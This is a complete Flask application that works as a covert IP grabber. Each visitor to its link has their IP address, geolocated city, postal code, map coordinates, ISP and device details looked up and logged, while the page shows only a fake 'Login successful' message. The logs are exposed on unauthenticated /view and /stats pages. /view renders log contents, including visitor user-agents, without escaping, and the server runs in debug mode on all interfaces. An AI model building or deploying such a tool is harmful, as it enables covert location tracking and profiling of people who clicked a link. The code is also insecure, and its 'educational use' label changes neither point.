from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import ipaddress
import re
import json

app = Flask(__name__)

# ============ GEOLOCATION & DEVICE FUNCTIONS ============

def get_real_ip():
    """Get real IP behind proxies"""
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip
    
    real_ip = request.headers.get('X-Real-IP')
    if real_ip:
        return real_ip
    
    return request.remote_addr

def is_private_ip(ip):
    """Check if IP is private/local"""
    try:
        return ipaddress.ip_address(ip).is_private
    except:
        return True

def get_geo_info(ip):
    """Get geolocation and ISP info using ipinfo.io"""
    if is_private_ip(ip):
        return {
            'ip': ip,
            'city': 'Private/Local',
            'region': 'Private',
            'country': 'Private',
            'isp': 'Private Network',
            'org': 'Private',
            'timezone': 'Local',
            'loc': '0,0',
            'postal': 'N/A',
            'hostname': 'N/A',
            'asn': 'N/A'
        }
    
    try:
        # Using ipinfo.io (free, 50,000 requests/day)
        res = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = res.json()
        
        if 'bogon' in data:
            return {
                'ip': ip,
                'city': 'Private/Local',
                'region': 'Private',
                'country': 'Private',
                'isp': 'Private Network',
                'org': 'Private',
                'timezone': 'Local',
                'loc': '0,0',
                'postal': 'N/A',
                'hostname': 'N/A',
                'asn': 'N/A'
            }
        
        # Extract location
        loc = data.get('loc', '0,0')
        
        return {
            'ip': data.get('ip', ip),
            'city': data.get('city', 'Unknown'),
            'region': data.get('region', 'Unknown'),
            'country': data.get('country', 'Unknown'),
            'isp': data.get('org', 'Unknown'),
            'org': data.get('org', 'Unknown'),
            'timezone': data.get('timezone', 'Unknown'),
            'loc': loc,
            'postal': data.get('postal', 'N/A'),
            'hostname': data.get('hostname', 'N/A'),
            'asn': data.get('org', 'Unknown').split()[0] if data.get('org') else 'N/A'
        }
    except Exception as e:
        print(f"[!] ipinfo.io error: {e}")
        # Fallback to ip-api.com if ipinfo fails
        try:
            res = requests.get(
                f"http://ip-api.com/json/{ip}?fields=status,message,city,region,country,isp,org,timezone,lat,lon,as",
                timeout=5
            )
            data = res.json()
            
            if data.get('status') == 'success':
                return {
                    'ip': ip,
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('region', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown'),
                    'loc': f"{data.get('lat', 0)},{data.get('lon', 0)}",
                    'postal': 'N/A',
                    'hostname': 'N/A',
                    'asn': data.get('as', 'N/A')
                }
        except:
            pass
        
        return {
            'ip': ip,
            'city': 'Error',
            'region': 'Error',
            'country': 'Error',
            'isp': 'Error',
            'org': 'Error',
            'timezone': 'Error',
            'loc': '0,0',
            'postal': 'N/A',
            'hostname': 'N/A',
            'asn': 'N/A'
        }

def get_browser_info(user_agent):
    """Extract browser, OS, and device info from User-Agent"""
    ua = user_agent.lower()
    
    # ========== BROWSER DETECTION ==========
    if 'chrome' in ua and 'edg' not in ua and 'opr' not in ua and 'whatsapp' not in ua:
        browser = 'Google Chrome'
        browser_version = 'Unknown'
        chrome_match = re.search(r'chrome/(\d+\.\d+\.\d+\.\d+)', ua)
        if chrome_match:
            browser_version = chrome_match.group(1)
    elif 'firefox' in ua:
        browser = 'Mozilla Firefox'
        browser_version = 'Unknown'
        firefox_match = re.search(r'firefox/(\d+\.\d+)', ua)
        if firefox_match:
            browser_version = firefox_match.group(1)
    elif 'safari' in ua and 'chrome' not in ua:
        browser = 'Apple Safari'
        browser_version = 'Unknown'
        safari_match = re.search(r'version/(\d+\.\d+\.\d+)', ua)
        if safari_match:
            browser_version = safari_match.group(1)
    elif 'edg' in ua:
        browser = 'Microsoft Edge'
        browser_version = 'Unknown'
        edge_match = re.search(r'edg/(\d+\.\d+\.\d+\.\d+)', ua)
        if edge_match:
            browser_version = edge_match.group(1)
    elif 'opr' in ua or 'opera' in ua:
        browser = 'Opera'
        browser_version = 'Unknown'
        opera_match = re.search(r'opr/(\d+\.\d+\.\d+\.\d+)', ua)
        if opera_match:
            browser_version = opera_match.group(1)
    elif 'whatsapp' in ua:
        browser = 'WhatsApp Browser'
        browser_version = 'Unknown'
    elif 'telegram' in ua:
        browser = 'Telegram Browser'
        browser_version = 'Unknown'
    elif 'instagram' in ua:
        browser = 'Instagram Browser'
        browser_version = 'Unknown'
    elif 'facebook' in ua:
        browser = 'Facebook Browser'
        browser_version = 'Unknown'
    elif 'bot' in ua or 'crawler' in ua or 'spider' in ua:
        browser = 'Bot/Crawler'
        browser_version = 'Unknown'
    else:
        browser = 'Unknown Browser'
        browser_version = 'Unknown'
    
    # ========== OS DETECTION ==========
    if 'windows 10' in ua:
        os = 'Windows 10'
    elif 'windows 11' in ua:
        os = 'Windows 11'
    elif 'windows' in ua and 'phone' in ua:
        os = 'Windows Phone'
    elif 'windows' in ua:
        os = 'Windows'
    elif 'android' in ua:
        os = 'Android'
        android_match = re.search(r'android (\d+\.\d+)', ua)
        if android_match:
            os = f'Android {android_match.group(1)}'
    elif 'iphone' in ua or 'ipad' in ua:
        if 'iphone' in ua:
            os = 'iOS (iPhone)'
        else:
            os = 'iOS (iPad)'
        ios_match = re.search(r'os (\d+_\d+_\d+)', ua)
        if ios_match:
            os = f'iOS {ios_match.group(1).replace("_", ".")}'
    elif 'mac os' in ua:
        os = 'macOS'
        mac_match = re.search(r'mac os x (\d+_\d+_\d+)', ua)
        if mac_match:
            os = f'macOS {mac_match.group(1).replace("_", ".")}'
    elif 'linux' in ua:
        os = 'Linux'
    else:
        os = 'Unknown OS'
    
    # ========== DEVICE TYPE DETECTION ==========
    if 'mobile' in ua or 'iphone' in ua or ('android' in ua and 'tablet' not in ua):
        device_type = 'Mobile Phone'
    elif 'tablet' in ua or 'ipad' in ua:
        device_type = 'Tablet'
    elif 'windows' in ua or 'mac' in ua or 'linux' in ua:
        device_type = 'Desktop Computer'
    else:
        device_type = 'Unknown Device'
    
    # ========== DEVICE MODEL ==========
    device_model = 'Unknown'
    
    # iPhone models
    if 'iphone' in ua:
        iphone_models = {
            'iphone16': 'iPhone 16',
            'iphone15': 'iPhone 15',
            'iphone14': 'iPhone 14',
            'iphone13': 'iPhone 13',
            'iphone12': 'iPhone 12',
            'iphone11': 'iPhone 11',
            'iphone xs': 'iPhone XS',
            'iphone xr': 'iPhone XR',
            'iphone x': 'iPhone X',
            'iphone 8': 'iPhone 8',
            'iphone 7': 'iPhone 7',
            'iphone 6': 'iPhone 6',
            'iphone 5': 'iPhone 5',
            'iphone 4': 'iPhone 4'
        }
        for key, model in iphone_models.items():
            if key in ua:
                device_model = model
                break
    
    # Samsung
    if 'samsung' in ua or 'sm-' in ua:
        samsung_match = re.search(r'sm-([a-z0-9]+)', ua)
        if samsung_match:
            device_model = f'Samsung Galaxy {samsung_match.group(1).upper()}'
        else:
            device_model = 'Samsung Galaxy'
    
    # Google Pixel
    if 'pixel' in ua:
        pixel_match = re.search(r'pixel (\d+)', ua)
        if pixel_match:
            device_model = f'Google Pixel {pixel_match.group(1)}'
        else:
            device_model = 'Google Pixel'
    
    # OnePlus
    if 'oneplus' in ua:
        oneplus_match = re.search(r'oneplus (\d+)', ua)
        if oneplus_match:
            device_model = f'OnePlus {oneplus_match.group(1)}'
        else:
            device_model = 'OnePlus'
    
    # Xiaomi
    if 'xiaomi' in ua or 'mi ' in ua:
        xiaomi_match = re.search(r'mi (\d+)', ua)
        if xiaomi_match:
            device_model = f'Xiaomi Mi {xiaomi_match.group(1)}'
        else:
            device_model = 'Xiaomi'
    
    # Huawei
    if 'huawei' in ua:
        device_model = 'Huawei'
    
    return {
        'browser': browser,
        'browser_version': browser_version,
        'os': os,
        'device_type': device_type,
        'device_model': device_model,
        'full_ua': user_agent
    }

# ============ PLAIN HTML - NO STYLE, WHITE BACKGROUND ============

SUCCESS_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Login successful</title>
</head>
<body>
    Login successful
</body>
</html>
'''

# ============ ROUTES ============

@app.route('/')
def index():
    """Log visitor info and show plain success page"""
    ip = get_real_ip()
    geo = get_geo_info(ip)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    browser_info = get_browser_info(user_agent)
    private = is_private_ip(ip)
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # ============ PRINT EVERYTHING TO CONSOLE ============
    print("\n" + "█"*70)
    print("█" + " " * 68 + "█")
    print("█" + " " * 15 + "🔐 NEW VISITOR DETECTED! 🔐" + " " * 14 + "█")
    print("█" + " " * 68 + "█")
    print("█"*70)
    print("\n" + "="*70)
    print("📋 VISITOR INFORMATION")
    print("="*70)
    
    print("\n🌐 NETWORK INFORMATION:")
    print("-"*70)
    print(f"  • IP Address      : {ip}")
    print(f"  • Hostname        : {geo['hostname']}")
    print(f"  • ASN             : {geo['asn']}")
    print(f"  • Private IP      : {private}")
    
    print("\n📍 LOCATION INFORMATION:")
    print("-"*70)
    print(f"  • City            : {geo['city']}")
    print(f"  • Region          : {geo['region']}")
    print(f"  • Country         : {geo['country']}")
    print(f"  • Postal Code     : {geo['postal']}")
    print(f"  • Timezone        : {geo['timezone']}")
    print(f"  • Coordinates     : {geo['loc']}")
    if geo['loc'] != '0,0' and geo['loc'] != '0,0':
        coords = geo['loc'].split(',')
        if len(coords) == 2 and coords[0] != '0' and coords[1] != '0':
            print(f"  • Google Maps     : https://www.google.com/maps?q={coords[0]},{coords[1]}")
            print(f"  • OpenStreetMap   : https://www.openstreetmap.org/?mlat={coords[0]}&mlon={coords[1]}&zoom=12")
    
    print("\n🏢 ISP INFORMATION:")
    print("-"*70)
    print(f"  • ISP             : {geo['isp']}")
    print(f"  • Organization    : {geo['org']}")
    
    print("\n💻 DEVICE INFORMATION:")
    print("-"*70)
    print(f"  • Device Type     : {browser_info['device_type']}")
    print(f"  • Device Model    : {browser_info['device_model']}")
    print(f"  • Operating System: {browser_info['os']}")
    
    print("\n🌐 BROWSER INFORMATION:")
    print("-"*70)
    print(f"  • Browser         : {browser_info['browser']}")
    print(f"  • Browser Version : {browser_info['browser_version']}")
    
    print("\n📱 USER-AGENT:")
    print("-"*70)
    print(f"  {user_agent}")
    
    print("\n⏰ TIMESTAMP:")
    print("-"*70)
    print(f"  {timestamp}")
    
    print("\n" + "="*70)
    print("✅ VISITOR LOGGED SUCCESSFULLY!")
    print("="*70 + "\n")
    
    # ============ SAVE TO FILE (optional) ============
    with open('visitors_log.txt', 'a') as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"TIME: {timestamp}\n")
        f.write(f"IP: {ip}\n")
        f.write(f"HOSTNAME: {geo['hostname']}\n")
        f.write(f"ASN: {geo['asn']}\n")
        f.write(f"CITY: {geo['city']}\n")
        f.write(f"REGION: {geo['region']}\n")
        f.write(f"COUNTRY: {geo['country']}\n")
        f.write(f"POSTAL: {geo['postal']}\n")
        f.write(f"TIMEZONE: {geo['timezone']}\n")
        f.write(f"LOCATION: {geo['loc']}\n")
        f.write(f"ISP: {geo['isp']}\n")
        f.write(f"ORG: {geo['org']}\n")
        f.write(f"DEVICE TYPE: {browser_info['device_type']}\n")
        f.write(f"DEVICE MODEL: {browser_info['device_model']}\n")
        f.write(f"OS: {browser_info['os']}\n")
        f.write(f"BROWSER: {browser_info['browser']} {browser_info['browser_version']}\n")
        f.write(f"PRIVATE IP: {private}\n")
        f.write(f"USER-AGENT: {user_agent}\n")
        f.write(f"{'='*70}\n")
    
    # Return plain success page
    return render_template_string(SUCCESS_PAGE)

@app.route('/view')
def view():
    """View all captured logs"""
    try:
        with open('visitors_log.txt', 'r') as f:
            content = f.read()
            return f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>IP Logger - Logs</title>
                <style>
                    body {{ font-family: 'Courier New', monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }}
                    .container {{ max-width: 900px; margin: 0 auto; }}
                    h1 {{ color: #4ec9b0; }}
                    .logs {{ background: #2d2d2d; padding: 20px; border-radius: 8px; white-space: pre-wrap; word-wrap: break-word; }}
                    .back {{ color: #569cd6; text-decoration: none; display: inline-block; margin-bottom: 20px; }}
                    .back:hover {{ text-decoration: underline; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <a href="/" class="back">← Back</a>
                    <h1>📊 Visitor Logs</h1>
                    <div class="logs">{content}</div>
                </div>
            </body>
            </html>
            '''
    except:
        return "No logs yet."

@app.route('/stats')
def stats():
    """Show statistics"""
    try:
        with open('visitors_log.txt', 'r') as f:
            content = f.read()
            visitor_count = content.count('TIME:')
        
        # Count unique IPs
        ips = re.findall(r'IP: (.*?)\n', content)
        unique_ips = len(set(ips)) if ips else 0
        
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>IP Logger - Stats</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #1e1e1e; color: white; padding: 40px; }}
                .container {{ max-width: 600px; margin: 0 auto; }}
                .stat {{ background: #2d2d2d; padding: 25px; border-radius: 8px; margin: 15px 0; text-align: center; }}
                .number {{ font-size: 48px; font-weight: bold; color: #4ec9b0; }}
                .label {{ color: #888; font-size: 14px; margin-top: 5px; }}
                .back {{ color: #569cd6; text-decoration: none; display: inline-block; margin-bottom: 20px; }}
                .back:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <a href="/" class="back">← Back</a>
                <h1>📊 Statistics</h1>
                <div class="stat">
                    <div class="number">{visitor_count}</div>
                    <div class="label">Total Visitors</div>
                </div>
                <div class="stat">
                    <div class="number">{unique_ips}</div>
                    <div class="label">Unique IPs</div>
                </div>
            </div>
        </body>
        </html>
        '''
    except:
        return "No data yet."

if __name__ == '__main__':
    print("\n" + "="*70)
    print("📍 IP GEOLOCATION LOGGER (ipinfo.io)")
    print("="*70)
    print("✅ Uses ipinfo.io API (50,000 requests/day)")
    print("✅ Tracks visitor IP addresses")
    print("✅ Geolocation (City, Region, Country)")
    print("✅ ISP Detection")
    print("✅ Coordinates (Latitude, Longitude)")
    print("✅ Postal Code & Hostname")
    print("✅ Device & Browser Detection")
    print("✅ Shows: 'Login successful' (plain text)")
    print("✅ ALL DATA PRINTED TO CONSOLE")
    print("❌ NO passwords or emails stored")
    print("="*70)
    print("\n[+] Server: http://localhost:5000")
    print("[+] View Logs: http://localhost:5000/view")
    print("[+] Stats: http://localhost:5000/stats")
    print("\n[!] FOR EDUCATIONAL USE ONLY")
    print("="*70 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
